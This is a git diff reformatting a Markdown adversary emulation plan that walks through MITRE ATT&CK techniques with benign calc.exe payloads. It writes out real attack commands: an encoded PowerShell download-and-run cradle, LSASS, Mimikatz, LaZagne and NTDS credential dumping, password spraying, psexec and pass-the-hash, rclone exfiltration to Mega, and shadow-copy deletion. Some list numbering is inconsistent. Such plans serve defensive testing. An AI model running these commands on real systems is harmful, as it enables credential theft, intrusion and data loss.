@@ -72,21 +72,27 @@ https://github.com/Sam0x90/CTI/blob/main/ATT%26CK/Techniques/T1608_Stage_Capabil
 
 This LNK will run the following powershell command line:
 
-```powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JAB1AHIAbAA9ACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBTAGEAbQAwAHgAOQAwAC8AQwBUAEkALwByAGEAdwAvAG0AYQBpAG4ALwBBAGQAdgBlAHIAcwBhAHIAeQAlADIAMABFAG0AdQBsAGEAdABpAG8AbgAlADIAMABQAGwAYQBuAHMALwAyADAAMgAyAF8AVABvAHAAMwA1AF8ATQBpAHQAcgBlAC8AYwBhAGwAYwAuAGUAeABlACIAOwAkAHAAYQB0AGgAPQAiAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAYwBhAGwAYwAuAGUAeABlACIAOwBpAHcAcgAgAC0AdQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABwAGEAdABoADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABwAGEAdABoAA==```
+```
+powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JAB1AHIAbAA9ACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBTAGEAbQAwAHgAOQAwAC8AQwBUAEkALwByAGEAdwAvAG0AYQBpAG4ALwBBAGQAdgBlAHIAcwBhAHIAeQAlADIAMABFAG0AdQBsAGEAdABpAG8AbgAlADIAMABQAGwAYQBuAHMALwAyADAAMgAyAF8AVABvAHAAMwA1AF8ATQBpAHQAcgBlAC8AYwBhAGwAYwAuAGUAeABlACIAOwAkAHAAYQB0AGgAPQAiAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAYwBhAGwAYwAuAGUAeABlACIAOwBpAHcAcgAgAC0AdQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABwAGEAdABoADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABwAGEAdABoAA==
+```
 
 This is the decoded command, which will download a legit Windows calc.exe from this repository before running it: 
 
-```$url="https://github.com/Sam0x90/CTI/raw/main/Adversary%20Emulation%20Plans/2022_Top35_Mitre/calc.exe";$path="C:\Users\Public\calc.exe";iwr -uri $url -OutFile $path;Start-Process -FilePath $path```
+```
+$url="https://github.com/Sam0x90/CTI/raw/main/Adversary%20Emulation%20Plans/2022_Top35_Mitre/calc.exe";$path="C:\Users\Public\calc.exe";iwr -uri $url -OutFile $path;Start-Process -FilePath $path
+```
 
 ### Step 10 - Execution/Discovery: T1059.001 Powershell & T1135 Network Share Discovery
 
 Using Powerview, here is procedure example:
 
-```Invoke-ShareFinder -CheckShareAccess - Verbose | Out-File -Encoding ascii C:\ProgramData\shares.txt```
+```
+Invoke-ShareFinder -CheckShareAccess - Verbose | Out-File -Encoding ascii C:\ProgramData\shares.txt
+```
 
 ### Step 11 - Execution/Discovery: T1059.001 Powershell
 
-"Using Powerview recon script to execute several discovery commands such as:
+Using Powerview recon script to execute several discovery commands such as:
 
 ```
 Get-NetLocalGroup
@@ -102,11 +108,15 @@ Get-DomainPolicy
 
 ### Step 12 - Execution/Discovery: T1047 Windows Management Instrumentation & T1518 Software Discovery
 
-```wmic product get name,version```
+```
+wmic product get name,version
+```
 
 ### Step 13 - Execution/Discovery: T1047 Windows Management Instrumentation & T1082 System Information Discovery
 
-```wmic computersystem get domain```
+```
+wmic computersystem get domain
+```
 
 ### Step 14 - Execution/Persistence: T1047 Windows Management Instrumentation & T1546.003 Event Triggered Execution: WMI Event Subscription
 
@@ -117,11 +127,15 @@ Get-DomainPolicy
 
 ### Step 15 - Execution/Lateral Movement: T1047 Windows Management Instrumentation & T1021.006 Remote Services: Windows Remote Management
 
-```wmic /node:IP process call create "cmd.exe /c start C:\windows\system32\calc.exe"```
+```
+wmic /node:IP process call create "cmd.exe /c start C:\windows\system32\calc.exe"
+```
 
 ### Step 16 - Persistence: T1053.005 Scheduled Task
 
-```schtasks.exe /Create /F /TN "{GUID}" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\thekey).xyz))) " /SC MINUTE /MO 30```
+```
+schtasks.exe /Create /F /TN "{GUID}" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\thekey).xyz))) " /SC MINUTE /MO 30
+```
 
 ### Step 17 - Persistence: T1547.001 Registry Run Keys / Stratup Folder
 
@@ -155,52 +169,94 @@ run
 
 Because regsvr32 is used to register or unregister an OLE object, the DLL needs and will executes by default an export function named DllRegisterServer.
 1. Download this harmless DLL from RedCanary github: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll
-2. Execute: ```regsvr32.exe /s .\Downloads\AllTheThingsx86.dll```
+2. Execute:
+```
+regsvr32.exe /s .\Downloads\AllTheThingsx86.dll
+```
 
 This DLL was part of an open source project that no longer exists but the DLL is harmless and has been built to be loaded in various ways such as DllRegisterServer function. Upon execution the function DllRegisterServer will execute calc.exe. You should therefore see a calculator pops up on the screen. Alternatively you can remove the "/s" argument (silent) to get a confirmation (or error) message about the execution, though attackers usually use the "/s" argument to avoid tipping off potential user. 
 
 ### Step 21 - Defense Evasion: T1218.011 System Binary Proxy Execution: Rundll32
 
 Calling export function name with arguments
-```rundll32 advpack.dll, RegisterOCX ""cmd.exe /c calc.exe""```
+```
+rundll32 advpack.dll, RegisterOCX ""cmd.exe /c calc.exe""
+```
 
 Calling export function by ordinal with arguments
-```rundll32 ""advpack.dll,#12"" ""cmd.exe /c calc.exe""```
+```
+rundll32 ""advpack.dll,#12"" ""cmd.exe /c calc.exe""
+```
 
 Calling export function by negative ordinal number with args
-```rundll32 ""advpack.dll,#-4294967284"" ""cmd.exe /c calc.exe""```
+```
+rundll32 ""advpack.dll,#-4294967284"" ""cmd.exe /c calc.exe""
+```
 
 ### Step 22 - Credential Access: T1003.001 OS Credential Dumping: LSASS Memory & S0002 Mimikatz & S0349 Lazagne
 
 1. Dump LSASS Memory using comsvcs.dll by running the following command in an elevated command prompt:
-  1.1 ```rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Users\purple\lsass-comsvcs.dmp full```
-2. Download Mimikatz here: https://github.com/gentilkiwi/mimikatz/releases/latest and run the following in an elevated command prompt:
-   2.1 ```mimikatz.exe```
+  1.1
+   ```
+   rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Users\purple\lsass-comsvcs.dmp full
+   ```
+3. Download Mimikatz here: https://github.com/gentilkiwi/mimikatz/releases/latest and run the following in an elevated command prompt:
+   2.1
+   ```
+   mimikatz.exe
+   ```
    
-   2.2 ```privilege::debug```
+   2.2
+   ```
+   privilege::debug
+   ```
    
-   2.3 ```sekurlsa::logonpasswords```
-4. Download ""Invoke-Mimikatz"" as m.ps1 and run the following in an elevated Powershell prompt:
-  3.1 ```Import-Module C:\Users\purple\m.ps1; Invoke-Mimikatz -ComputerName <COMPUTER_NAME>```
-5. Download LaZagne here: https://github.com/AlessandroZ/LaZagne/releases/latest and run the following in an elevated command prompt:
-  4.1 ```lazagne.exe all -oN -output C:\Users\purple```
-6. Execute the same procedure as 4 but with a renamed binary 
-  5.1 ```ls.exe all -oN -output C:\Users\purple```
+   2.3
+   ```
+   sekurlsa::logonpasswords
+   ```
+
+5. Download ""Invoke-Mimikatz"" as m.ps1 and run the following in an elevated Powershell prompt:
+  3.1
+   ```
+   Import-Module C:\Users\purple\m.ps1; Invoke-Mimikatz -ComputerName <COMPUTER_NAME>
+   ```
+7. Download LaZagne here: https://github.com/AlessandroZ/LaZagne/releases/latest and run the following in an elevated command prompt:
+  4.1
+   ```
+   lazagne.exe all -oN -output C:\Users\purple
+   ```
+9. Execute the same procedure as 4 but with a renamed binary 
+  5.1
+   ```
+   ls.exe all -oN -output C:\Users\purple
+   ```
 
 ### Step 23 - Credential Access: T1003.003 OS Credential Dumping: NTDS
 
 1. Dump NTDS with ntdsutil by running the following in a command prompt on DC:
-   1.1 ```ntdsutil ""ac i ntds"" ""ifm"" ""create full dump_folder"" q q```
+   1.1
+   ```
+   ntdsutil ""ac i ntds"" ""ifm"" ""create full dump_folder"" q q
+   ```
 
-2. Dump NTDS using secretsdump.py downloaded at: https://github.com/fortra/impacket/blob/master/examples/secretsdump.py
-   2.1 ```python3 secretsdump.py -just-dc domain/user@DChostname```
+3. Dump NTDS using secretsdump.py downloaded at: https://github.com/fortra/impacket/blob/master/examples/secretsdump.py
+   2.1
+   ```
+   python3 secretsdump.py -just-dc domain/user@DChostname
+   ```
    
-   2.2 ```python3 secretsdump.py -just-dc domain/user@DC hostname -use-vss```
+   2.2
+   ```
+   python3 secretsdump.py -just-dc domain/user@DC hostname -use-vss
+   ```
 
 ### Step 24 - Credential Access: T1110.003 Brute force: Password Spraying
 
 Download password spray script at https://github.com/dafthack/DomainPasswordSpray and run the following:
-```Import-Module .\domainpasswordspary.ps1; Invoke-DomainPasswordSpray -UserList .\users.txt -domain domain.local -PasswordList passwords.txt -OutFile creds.txt```
+```
+Import-Module .\domainpasswordspary.ps1; Invoke-DomainPasswordSpray -UserList .\users.txt -domain domain.local -PasswordList passwords.txt -OutFile creds.txt
+```
 
 ### Step 25 - Discovery: T1482 Domain Trust Discovery & T1018 Remote System Discovery & T1016 System Network Configuration Discovery & T1082 System Information Discovery
 
@@ -223,7 +279,9 @@ net localgroup
 
 ### Step 26 - Discovery: T1087.002 Account Discovery: Domain Account & T1018 Remote System Discovery & S0552 AdFind
 
-```adfind.exe```
+```
+adfind.exe
+```
 
 renamed_adfind.exe
 
@@ -239,7 +297,9 @@ Use mstsc.exe to login into a remote computer of your choice
 ### Step 28 - Lateral Movement: T1021.002 Remote Services: SMB/Windows Admin Shares
 
 Download psexec from official source:  https://learn.microsoft.com/en-us/sysinternals/downloads/psexec and run the following command:
-```psexec.exe  \\<IP ADDRESS> -u <DOMAIN>\Administrator -p ""<PASSWORD>"" -s -d -h -r mstdc -accepteula -nobanner C:\windows\system32\calc.exe```
+```
+psexec.exe  \\<IP ADDRESS> -u <DOMAIN>\Administrator -p ""<PASSWORD>"" -s -d -h -r mstdc -accepteula -nobanner C:\windows\system32\calc.exe
+```
 
 ### Step 29 - Lateral Movement: T1550.002 Use Alternate Authentication Material: Pass the Hash
 
@@ -262,14 +322,21 @@ exploit
 PSExec
 1. Using the NTLM hash from previous Mimikatz test
 2. Run the following mimikatz command 
-```sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTHASH>```
-3. In the new cmd windows opened, run the following psexec command: ```psexec \\<IP> cmd.exe```
+```
+sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTHASH>
+```
+4. In the new cmd windows opened, run the following psexec command:
+   ```
+   psexec \\<IP> cmd.exe
+   ```
 
 ### Step 30 - Collection: T1560.001 Archive Collected Data: Archive via Utility & S0160 certutil
 
 Usage of certutil and 7z using the following command lines:
-1. ```certutil -encode inputFile outputFile```
-2. ```C:\Windows\system32\cmd.exe /C 7za.exe a -tzip -mx5 c:\programdata\lsass.zip c:\programdata\lsass.dmp```
+```
+certutil -encode inputFile outputFile
+C:\Windows\system32\cmd.exe /C 7za.exe a -tzip -mx5 c:\programdata\lsass.zip c:\programdata\lsass.dmp
+```
 
 ### Step 31 - Command and Control: T1219 Remote Access Software
 
@@ -284,28 +351,38 @@ Those tools usually have a free version but it requires to sign up with an accou
 1. Download flightsim from: https://github.com/alphasoc/flightsim/releases
 2. Follow installation procedure depending on package downloaded.
 3. Run the following commands to simulate C2 traffic:
-```flightsim run c2:trickbot```
-```flightsim run c2:bumblebee```
-```flightsim run ""c2:raccoon stealer""```
-```flightsim run ""c2:redline stealer""```
-```flightsim run ""c2:respberry robin""```
-```flightsim run ""c2:raccoon stealer""```
-```flightsim run ""c2:remcos rat""```
+```
+flightsim run c2:trickbot
+flightsim run c2:bumblebee
+flightsim run ""c2:raccoon stealer""
+flightsim run ""c2:redline stealer""
+flightsim run ""c2:respberry robin""
+flightsim run ""c2:raccoon stealer""
+flightsim run ""c2:remcos rat""
+```
 
 Alternatively, run the following command to retrieve the list of all c2 families available for you to test:
-```flightsim get c2:families```
+```
+flightsim get c2:families
+```
 
 ### Step 33 - Exfiltration: T1567 Exfiltration Over Web Service: Exfiltration to Cloud Storage & S1040 Rclone
 
-```rclone.exe copy ''\\server\path" mega:folder -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6```
+```
+rclone.exe copy ''\\server\path" mega:folder -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6
+```
 
 ### Step 34 - Impact: T1490 Inhibit System Recovery
 
-```vssadmin delete shadows /all /quiet```
+```
+vssadmin delete shadows /all /quiet
+```
 
 ### Step 35 - Impact: T1490 Inhibit System Recovery
 
-```wmic shadowcopy delete```
+```
+wmic shadowcopy delete
+```
 
 
 # TO-DO:
